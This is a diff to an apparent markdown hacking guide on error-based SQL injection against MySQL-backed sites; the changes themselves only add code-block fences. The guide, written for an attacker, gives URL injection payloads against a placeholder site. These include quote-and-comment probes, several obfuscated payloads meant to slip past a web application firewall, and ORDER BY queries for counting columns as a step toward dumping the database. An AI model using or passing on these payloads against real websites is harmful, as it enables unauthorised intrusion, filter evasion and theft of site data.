@@ -3,7 +3,7 @@
 This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the MySQL database by using the SQL error messages to his advantage.
 
 ## Detecting the vulnerability
-
+```
 <code>https://site.com/index.php?id=1</code>
 Website load successfully.
 
@@ -34,10 +34,10 @@ Website might loads successfuly, but it might shows error also
 
 <code>https://site.com/index.php?id=1+--+</code>
 Website might loads successfuly, but it might shows error also
-
+```
 # Bypassing WAF to detect the vulnerability (if the first methodology didn't work)
 In some cases, WAF won't let you to cause errors on the website, so sending special queries might be needed to bypass WAF.
-
+```
 <code>https://site.com/index.php?id=1'--/**/-</code>
 If no WAF Warning is shown and website loads up, we confirm the vulnerability, else try the following payloads.
 
@@ -57,10 +57,10 @@ If no WAF Warning is shown and website loads up, we confirm the vulnerability, e
 <code>https://site.com/index.php?id=1'--#qa%0A#%0A-</code>
 <code>https://site.com/index.php?id=/*!20000%0d%0a1'--+-*/</code>
 <code>https://site.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/</code>
-
+```
 ## Find the number of columns using 'ORDER BY' query
 Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using ORDER BY
-
+```
 <code>https://site.com/index.php?id=1' order by 1-- -</code>
 This query musn't shows up error, since there is no lower number than 1
-
+```
